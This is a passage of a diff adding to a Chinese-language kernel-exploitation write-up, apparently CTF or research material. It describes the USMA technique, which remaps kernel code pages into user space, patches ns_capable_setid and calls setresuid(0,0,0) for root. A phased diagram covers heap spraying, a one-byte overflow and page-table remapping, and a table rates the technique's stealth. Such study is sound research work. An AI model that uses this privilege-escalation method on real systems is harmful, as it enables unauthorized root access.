+- 保持函数调用约定完整
+
+#### 步骤6：触发修改并获取权限
+
+调用`setresuid(0, 0, 0)`系统调用，触发修改后的`ns_capable_setid`函数，获取root权限。通过验证当前用户ID确认权限提升成功。
+
+**setresuid系统调用**：
+
+```c
+int setresuid(uid_t ruid, uid_t euid, uid_t suid);
+```
+
+- 设置为0表示root用户
+- 内部调用`ns_capable_setid`进行权限检查
+- 修改后的函数直接返回成功
+
+### 6-6. 主控制流程
+
+USMA技术的完整执行流程通过六个阶段实现，从环境初始化到权限获取，展示了系统级内存控制技术的完整应用路径。
+
+```mermaid
+sequenceDiagram
+    participant 用户进程
+    participant 内核
+    participant 物理内存
+    participant 页表管理
+    participant 系统调用
+
+    Note over 用户进程,系统调用: 阶段1: 环境初始化
+    用户进程->>内核: 打开设备文件
+    用户进程->>内核: 绑定CPU核心
+    用户进程->>内核: 分配管道资源
+
+    Note over 用户进程,系统调用: 阶段2: 内存布局控制
+    用户进程->>内核: 创建管道阵列
+    用户进程->>内核: 交替释放策略
+    用户进程->>物理内存: 建立确定性布局
+
+    Note over 用户进程,系统调用: 阶段3: 核心操作执行
+    用户进程->>内核: 触发单字节溢出
+    用户进程->>内核: 建立非对称页面共享
+    用户进程->>物理内存: 构建控制链
+
+    Note over 用户进程,系统调用: 阶段4: 系统内存勘探
+    用户进程->>物理内存: 扫描vmemmap区域
+    用户进程->>物理内存: 定位任务结构
+    用户进程->>页表管理: 提取PGD地址
+
+    Note over 用户进程,系统调用: 阶段5: USMA权限提升
+    用户进程->>内核: 创建用户空间映射
+    用户进程->>页表管理: 重映射地址空间
+    用户进程->>物理内存: 修改内核代码
+    用户进程->>系统调用: 调用setresuid
+    系统调用->>内核: 执行修改后函数
+    内核-->>用户进程: 返回权限提升结果
+
+    Note over 用户进程,系统调用: 阶段6: 资源清理
+    用户进程->>内核: 关闭文件描述符
+    用户进程->>内核: 释放内存资源
+    用户进程->>物理内存: 清理临时数据
+```
+
+**阶段分解**：
+
+1. **环境初始化**：建立操作基础，包括设备访问、CPU绑定和资源分配
+2. **内存布局控制**：通过管道堆喷和交替释放，建立确定性的物理内存布局
+3. **核心操作执行**：触发单字节溢出，建立非对称页面共享，构建控制链
+4. **系统内存勘探**：扫描系统内存，定位关键数据结构，提取页表根地址
+5. **USMA权限提升**：通过页表重映射修改内核代码，实现权限提升
+6. **资源清理**：释放所有分配的资源，确保系统状态完整
+
+### 6-7. 技术对比
+
+USMA技术与内核栈控制技术在多方面存在显著差异，展示了不同的技术路径和实现策略。
+
+| 评估维度       | 内核栈利用技术 | USMA技术       |
+| -------------- | -------------- | -------------- |
+| **操作目标**   | 内核栈返回地址 | 内核页表条目   |
+| **修改方式**   | 注入ROP链      | 重映射代码页   |
+| **执行环境**   | 内核上下文     | 用户空间上下文 |
+| **修改位置**   | 内核栈内存     | 内核代码段     |
+| **技术复杂度** | 中等           | 较高           |
+| **隐蔽性**     | 较低           | 较高           |
+| **系统影响**   | 较大           | 较小           |
+| **恢复难度**   | 困难           | 容易           |
+| **检测难度**   | 较易检测       | 较难检测       |
+| **稳定性**     | 中等           | 高             |
+
+### 6-8. 技术总结
+
+USMA（用户空间内存映射攻击）技术是一种创新的内核控制方法，它通过直接修改页表条目将内核代码段重映射到用户空间，从而在用户空间实现对内核代码的运行时修改。与通过修改内核栈布局ROP链实现提权的技术路径相比，USMA技术具有本质差异：前者通过控制流劫持和代码重用实现权限提升，而USMA技术则通过页表操作直接在代码段层面修改内核执行逻辑。这种技术具有更高的隐蔽性、稳定性和兼容性，其核心优势在于绕过内存保护机制，通过页表重映射实现安全的内核代码修改，为内核安全研究提供了新的技术视角和实践案例，同时揭示了当前内存防护体系的潜在弱点，推动了内存安全技术的持续演进。
+
+### 6-9. 测试结果
+
+<div style="text-align: center; margin: 2rem 0;">
+  <img src="/images/posts/KernelExploit/CrossCacheOverflow/CrossCacheOverflow_005.png"
+       style="border-radius: 12px; 
+              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+              max-width: 100%;
+              height: auto;">
+</div>
+
 ## 参考
 
 - https://github.com/BinRacer/pwn4kernel/tree/master/src/PageLevelUAF2
+- https://github.com/BinRacer/pwn4kernel/tree/master/src/PageLevelUAF3
 - https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE
 - https://github.com/arttnba3/Linux-kernel-exploitation/blob/main/tools/kernelpwn.h
